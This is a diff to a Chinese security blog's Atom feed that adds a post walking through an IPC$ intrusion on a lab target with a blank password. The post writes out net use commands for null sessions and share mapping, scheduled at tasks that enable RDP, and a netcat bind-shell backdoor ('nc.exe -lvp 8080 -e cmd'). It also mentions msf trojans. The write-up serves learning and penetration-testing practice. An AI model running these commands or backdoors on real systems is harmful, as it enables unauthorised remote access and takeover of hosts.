@@ -6,7 +6,7 @@
   <link href="https://ey404.github.io/atom.xml" rel="self"/>
   
   <link href="https://ey404.github.io/"/>
-  <updated>2021-03-08T00:22:21.047Z</updated>
+  <updated>2021-03-08T12:18:39.506Z</updated>
   <id>https://ey404.github.io/</id>
   
   <author>
@@ -15,6 +15,32 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>记一次IPC$渗透</title>
+    <link href="https://ey404.github.io/2021/03/08/%E8%AE%B0%E4%B8%80%E6%AC%A1IPC-%E6%B8%97%E9%80%8F/"/>
+    <id>https://ey404.github.io/2021/03/08/%E8%AE%B0%E4%B8%80%E6%AC%A1IPC-%E6%B8%97%E9%80%8F/</id>
+    <published>2021-03-08T12:09:36.000Z</published>
+    <updated>2021-03-08T12:18:39.506Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="IPC-介绍"><a href="#IPC-介绍" class="headerlink" title="IPC$介绍"></a>IPC$介绍</h2><h3 id="IPC-概念"><a href="#IPC-概念" class="headerlink" title="IPC$概念"></a>IPC$概念</h3><p><code>IPC$</code>(Internet Process Connection)是共享”命名管道”的资源,它是为了让进程间通信而开放的命名管道，可以通过验证用户名和密码获取相应的权限，再远程计算机和查看计算机的共享资源时使用。</p><h3 id="IPC-作用"><a href="#IPC-作用" class="headerlink" title="IPC$作用"></a>IPC$作用</h3><p>利用<code>IPC$</code>,攻击者可以与目标主机建立一个连接，通过这个连接可以获取目标主机的目录结构，用户列表信息等…</p><p><code>IPC$</code>还有一种空连接的形式，不需要用户名和密码。虽然空连接没有任何权限，但是也可以得到目标主机用户列表。</p><h3 id="常用IPC-命令"><a href="#常用IPC-命令" class="headerlink" title="常用IPC$命令"></a>常用IPC$命令</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">net share ipc$      &#x2F;&#x2F;开启ipc$</span><br><span class="line">net share ipc$ &#x2F;del &#x2F;&#x2F;关闭ipc$共享</span><br><span class="line">net use \\IP\ipc$ &quot;&quot; &#x2F;user:&quot;&quot;&#x2F;&#x2F;建立空连接</span><br><span class="line">net use \\IP\ipc$ &quot;用户名&quot; &#x2F;user:&quot;密码&quot;&#x2F;&#x2F;建立连接</span><br><span class="line">net use z: \\ip\c$                &#x2F;&#x2F;映射目标主机c盘到本地z盘              </span><br><span class="line">net use \\IP\ipc$ &#x2F;del              &#x2F;&#x2F;删除一个ipc$连接</span><br><span class="line">net use z: &#x2F;del                    &#x2F;&#x2F;删除映射目录</span><br></pre></td></tr></table></figure><h3 id="常见错误代码"><a href="#常见错误代码" class="headerlink" title="常见错误代码"></a>常见错误代码</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">错误号5，拒绝访问：很可能你使用的用户不是管理员权限的，先提升权限； </span><br><span class="line">错误号51，Windows无法找到网络路径：网络有问题； </span><br><span class="line">错误号53，找不到网络路径：ip地址错误；目标未开机；目标lanmanserver服务未启动；目标有防火墙（端口过滤）； </span><br><span class="line">错误号67，  找不到网络名：你的lanmanworkstation服务未启动或者目标删除了ipc$； </span><br><span class="line">错误号1219，提供的凭据与已存在的凭据集冲突：你已经和对方建立了一个ipc$，请删除再连； </span><br><span class="line">错误号1326，未知的用户名或错误密码：原因很明显了； </span><br><span class="line">错误号1792，试图登录，但是网络登录服务没有启动：目标NetLogon服务未启动； </span><br><span class="line">错误号2242，此用户的密码已经过期：目标有帐号策略，强制定期要求更改密码</span><br></pre></td></tr></table></figure><h2 id="IPC-渗透"><a href="#IPC-渗透" class="headerlink" title="IPC$渗透"></a>IPC$渗透</h2><h3 id="内网-信息收集"><a href="#内网-信息收集" class="headerlink" title="内网-信息收集"></a>内网-信息收集</h3><p>通过内网扫描工具(NTscan)扫描内网发现可能存在一台IPC$漏洞的靶机，且密码为空。</p><p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210308161516655.png" alt="image-20210308161516655"></p><h3 id="IPC-连接"><a href="#IPC-连接" class="headerlink" title="IPC$连接"></a>IPC$连接</h3><ul><li>与目标主机建立ipc$连接</li></ul><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">net</span> use \\<span class="number">10</span>.<span class="number">7</span>.<span class="number">6</span>.<span class="number">177</span>\ipc$ &quot;&quot; /user:&quot;Administrator&quot;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210308162606862.png" alt="image-20210308162606862"></p><ul><li>把目标主机的C盘映射到本地z盘</li></ul><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">net</span> use z: \\<span class="number">10</span>.<span class="number">7</span>.<span class="number">6</span>.<span class="number">177</span>\c$</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210308162858310.png" alt="image-20210308162858310"></p><h2 id="获取主机权限"><a href="#获取主机权限" class="headerlink" title="获取主机权限"></a>获取主机权限</h2><blockquote><p>现在已经成功ipc$连接，接下来想要拿下目标主机的权限，且已知密码为空，现有两种思路</p><p>1.让目标主机开放3389端口，远程连接</p><p>2.让目标主机开放一个后门端口</p></blockquote><h3 id="方法一）"><a href="#方法一）" class="headerlink" title="方法一）"></a>方法一）</h3><ul><li>目标靶机未开放3389端口</li></ul><p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210308164419733.png" alt="image-20210308164419733"></p><ul><li>写入一个3389.bat到目标主机的C盘中</li></ul><p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210308164839805.png" alt="image-20210308164839805"></p><ul><li>通过at命令来添加一个计划任务</li></ul><p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210308165131844.png" alt="image-20210308165131844"></p><ul><li>目标靶机已开放3389端口</li></ul><p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210308165206880.png" alt="image-20210308165206880"></p><ul><li>拿到主机权限</li></ul><p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210308194713755.png" alt="image-20210308194713755"></p><h3 id="方法二）"><a href="#方法二）" class="headerlink" title="方法二）"></a>方法二）</h3><ul><li>上传一个<code>nc.exe</code> 和一个<code>nc.bat</code>,<code>nc.bat</code>的内容如下：</li></ul><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\<span class="title">nc.exe</span> -<span class="title">lvp</span> 8080 -<span class="title">e</span> <span class="title">cmd</span></span></span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210308195332482.png" alt="image-20210308195332482"></p><ul><li>通过at命令来添加一个计划任务</li></ul><p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210308195505842.png" alt="image-20210308195505842"></p><ul><li>靶机8080端口已打开</li></ul><p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210308195609508.png" alt="image-20210308195609508"></p><ul><li>拿到主机权限</li></ul><p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210308195641736.png" alt="image-20210308195641736"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>至此这台靶机已经拿下，无论是通过写入<code>3389.bat</code>来开放一个<code>3389</code>端口,或者是上传一个<code>nc.bat</code>来开放一个后门端口让我们攻击机连接，都需要利用<code>IPC$</code>的连接，<code>at</code> 的命令添加任务计划。当然方法也不止如此，也可以<code>msf</code>生成木马，让目标主机<code>at</code>添加任务计划，然后返回一个<code>shell</code>。</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h2 id=&quot;IPC-介绍&quot;&gt;&lt;a href=&quot;#IPC-介绍&quot; class=&quot;headerlink&quot; title=&quot;IPC$介绍&quot;&gt;&lt;/a&gt;IPC$介绍&lt;/h2&gt;&lt;h3 id=&quot;IPC-概念&quot;&gt;&lt;a href=&quot;#IPC-概念&quot; class=&quot;headerlink&quot; titl</summary>
+      
+    
+    
+    
+    <category term="内网渗透" scheme="https://ey404.github.io/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
+    
+    
+    <category term="IPC$" scheme="https://ey404.github.io/tags/IPC/"/>
+    
+    <category term="shell" scheme="https://ey404.github.io/tags/shell/"/>
+    
+  </entry>
   
   <entry>
     <title>ATT&amp;CK红队实战(一)</title>
